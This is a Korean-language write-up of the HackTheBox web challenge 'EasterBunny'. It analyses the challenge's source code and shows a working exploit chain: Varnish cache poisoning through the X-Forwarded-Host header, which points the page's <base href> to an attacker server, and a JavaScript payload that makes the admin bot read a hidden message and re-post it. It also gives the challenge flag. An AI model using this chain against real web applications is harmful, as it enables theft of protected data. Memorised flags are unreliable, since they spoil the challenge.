# EasterBunny
![js](https://img.shields.io/badge/JavaScript-F7DF1E?style=for-the-badge&logo=JavaScript&logoColor=white)

![image](https://github.com/user-attachments/assets/01b0fcbe-f209-41d1-ad33-327ce1e002de)

## Source Code Analysis
```
async migrate() {
  return this.db.exec(`
    DROP TABLE IF EXISTS messages;
    CREATE TABLE IF NOT EXISTS messages (
      id        INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT,
      message   VARCHAR(300) NOT NULL,
      hidden    INTEGER NOT NULL
    );
  `);
}

INSERT INTO messages (id, message, hidden) VALUES
  (1, "Dear Easter Bunny,\nPlease could I have the biggest easter egg you have?\n\nThank you\nGeorge", 0),
  (2, "Dear Easter Bunny,\nCould I have 3 chocolate bars and 2 easter eggs please!\nYours sincerely, Katie", 0),
  (3, "Dear Easter Bunny, Santa's better than you! HTB{f4k3_fl4g_f0r_t3st1ng}", 1),
  (4, "Hello Easter Bunny,\n\nCan I have a PlayStation 5 and a chocolate chick??", 0),
  (5, "Dear Easter Bunny,\nOne chocolate and marshmallow bunny please\n\nLove from Milly", 0),
  (6, "Dear Easter Bunny,\n\nHow are you? I'm fine, please may I have 31 chocolate bunnies\n\nThank you\nBeth", 0);
```
- ```database.js```의 내용 중 일부, 3번째 편지에 플래그가 들어있는 것을 확인

```
{
  "error": "Sorry, this letter has been hidden by the Easter Bunny's helpers!",
  "count": 11
}
```
- ```/message/3```경로로 요청을 해보면 해당 값이 숨겨져 있고 총 편지의 수가 같이 반환된다는 것을 알 수 있다.

```
router.get("/message/:id", async (req, res) => {
  try {
    const { id } = req.params;
    const { count } = await db.getMessageCount();
    const message = await db.getMessage(id);

    if (!message) {
      return res.status(404).send({
        error: "Can't find this note!",
        count: count
      });
    }

    if (message.hidden && !isAdmin(req)) {
      return res.status(401).send({
        error: "Sorry, this letter has been hidden by the Easter Bunny's helpers!",
        count: count
      });
    }

    if (message.hidden) {
      res.set("Cache-Control", "private, max-age=0, s-maxage=0, no-cache, no-store");
    }

    return res.status(200).send({
      message: message.message,
      count: count
    });
  } catch (error) {
    console.error(error);
    res.status(500).send({
      error: "Something went wrong!"
    });
  }
});

const authSecret = require('crypto').randomBytes(69).toString('hex');

const isAdmin = (req) => {
  return req.ip === '127.0.0.1' && req.cookies['auth'] === authSecret;
};
```
- 다음 메시지를 받는 엔드포인트 코드를 살펴보면 숨겨진 메시지를 보려면 ```isAdmin()```을 우회해야 한다는 것을 알 수 있다.

```
const visit = async (url, authSecret) => {
  try {
    const browser = await puppeteer.launch(browser_options);
    let context = await browser.createIncognitoBrowserContext();
    let page = await context.newPage();

    await page.setCookie({
      name: 'auth',
      value: authSecret,
      domain: '127.0.0.1',
    });

    await page.goto(url, {
      waitUntil: 'networkidle2',
      timeout: 5000,
    });

    await page.waitForTimeout(3000);
    await browser.close();
  } catch (e) {
    console.log(e);
  }
};

router.post("/submit", async (req, res) => {
  const { message } = req.body;

  if (message) {
    return db.insertMessage(message)
      .then(async (inserted) => {
        try {
          botVisiting = true;
          await visit(`http://127.0.0.1/letters?id=${inserted.lastID}`, authSecret);
          botVisiting = false;
        } catch (e) {
          console.log(e);
          botVisiting = false;
        }

        res.status(201).send(response(inserted.lastID));
      })
      .catch(() => {
        res.status(500).send(response('Something went wrong!'));
      });
  }

  return res.status(401).send(response('Missing required parameters!'));
});
```
- ```isAdmin()```을 만족하는 방법은 ```bot.js```의 ```visit()```을 사용하여 우회 하는 방법이 존재한다.
- ```/submit``` 엔드포인트에 요청하여 실행한다.

```
router.get("/letters", (req, res) => {
  return res.render("viewletters.html", {
    cdn: `${req.protocol}://${req.hostname}:${req.headers["x-forwarded-port"] ?? 80}/static/`,
  });
});
```
- ```/letters```엔드포인트로 가보니 ```viewletters.html```을 렌더링하고 ```cdn```이라는 변수를 전달 하는것을 확인

```
<!-- viewletters.html -->
{% extends "base.html" %}

<!-- base.html -->
<head>
  <meta charset="UTF-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <base href="{{cdn}}" />

  <link rel="preconnect" href="https://fonts.googleapis.com" />
  <link rel="icon" type="image/x-icon" href="favicon.ico" />
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="" />
  <link href="https://fonts.googleapis.com/css2?family=Caveat&amp;family=Secular+One&amp;display=swap" rel="stylesheet" />
  <link href="main.css" rel="stylesheet" />

  <title>Write to the Easter Bunny!</title>
</head>
```
- ```viewletters.html```에서 확인해보니 ```base.html```을 상속 받는다.
- ```base.html```에서 확인결과 ```<base href />```태그에 ```cdn```변수를 사용한다.
- ```<base href="{{cdn}}" />```코드는 HTML 문서에서 기본 URL을 설정하는 태그로서 이 태그는 문서 내의 상대 URL들이 어떤 절대 URL에 대해 해석될지를 지정한다.

```
<link href="main.css" rel="stylesheet" />
<script src="viewletter.js"></script>

<!-- CDN -->
<link href="http://google.com/main.css" rel="stylesheet" />
<script src="http://google.com/viewletter.js"></script>
```
- 이러한 ```base```태그의 특징을 활용하여 공격자 서버의 스크립트를 로드하는 것이 가능해진다.
- 이 때 ```main.css```,```viewletter.js```와 같이 이미 파일의 이름은 정해져 있으므로 이를 맞춰서 공격하여야 한다.

```
sub vcl_hash {
  hash_data(req.url);

  if (req.http.host) {
    hash_data(req.http.host);
  } else {
    hash_data(server.ip);
  }

  return (lookup);
}
```
- 또한 제공된 파일에 ```cache.vcl```파일 존재를 확인하였다.
- Varnish Cache서버를 사용하는것을 알 수 있고, 사용자가 세부적으로 캐싱동작을 설정하고있다.
- 코드를 살펴보면 기본적으로 url과 host 또는 ip를 기준으로 캐싱하고, 공격자가 http header중 host,ip 주소를 127.0.0.1로 수정하고 특정 url 경로를 입력하면 해당 요청은 캐싱된다는것을 유추가능하다.

## PoC
위 내용으로 유추한 시나리오는 다음과 같다.
1. base태그의 href값(cdn)을 공격자 주소로 수정
2. ```viewletters.js```가 공격자 서버의 script로 변환되어 xss공격이 가능한 페이지를 캐싱하게 한다.
3. 아무 편지를 작성하고 ```/submit```엔드포인트로 요청을 보냈을 때 ```admin bot```이 공격자가 캐싱한 페이지를 방문하게 한다.
4. xss공격으로 ```admin bot```이 플래그가 존재하는 편지의 내용을 읽고 해당 내용으로 편지를 작성하게 하거나 공격자의 서버에 플래그를 전송하도록 한다.

```
await visit(`http://127.0.0.1/letters?id=${inserted.lastID}`, authSecret);
```
- 앞서 봇은 ```127.0.0.1/letters```로 요청을 보냈다.

![image](https://github.com/user-attachments/assets/f34765fc-fffd-4183-a72b-966ea0b9115c)
- 따라서 먼저 해당 엔드포인트로 요청을 보내 놓아야 한다.
- 이 때 주의할 점은 아래와 같다.
  - 캐싱이 되지 않은 ```url```에 요청을 보내야 한다.
  - 호스트를 ```127.0.0.1```로 해야 한다.
  - ```X-Forwarded-Host```헤더를 사용해야 하고, 공격자 서버의 IP를 넣어야 한다.

```
fetch("http://127.0.0.1:80/message/3")
  .then((r) => r.text())
  .then((x) => {
    fetch("http://127.0.0.1:80/submit", {
      headers: {
        "content-type": "application/json",
      },
      body: x,
      method: "POST",
      mode: "cors",
      credentials: "omit",
    });
  });
```
- 봇이 실행하게 될 ```viewletter.js```의 내용은 위와 같다. 먼저 ```fetch()```로 숨겨진 메시지를 읽고 해당 내용을 바디에 넣어 ```/submit```으로 요청을 보낸다.
- 문제는 해당 공격자서버를 외부접근이 허용되도록 해야하는데 ```ngrok```으로 터널링을 시도하였으나 처음 접속시 ip접근 확인 메시지가 떠서 불가능하였다.
- 해당 이유로 ```aws```의 무료 인스턴스를 사용하여 서버를 생성하였다.

![image](https://github.com/user-attachments/assets/9779cbb6-f0bb-48b3-a4a5-a6370551ca9d)
- 공격자 서버의 세팅과 ```cache poisoning```이 모두 끝났으니, 이제 봇이 편지를 읽어서 쓰도록 하면 된다.
- 이는 ```/submit```엔드포인트에 아무 메시지나 쓴 뒤, 요청을 보내서 수행할 수 있다.
- 응답 패킷을 보면 8번째 편지가 작성되었다는 것을 확인할 수 있다.
- 봇은 사용자가 작성한 8번째 편지를 검증하는 과정 중에 플래그 값을 편지에 써서 업로드했을 것이다.
- 따라서 9번째 편지를 조회하면 플래그를 획득할 수 있다.

![image](https://github.com/user-attachments/assets/4c475a31-c86f-4407-832c-d756d980827e)
```
HTB{7h3_3as7er_bunny_h45_b33n_p0150n3d!
```



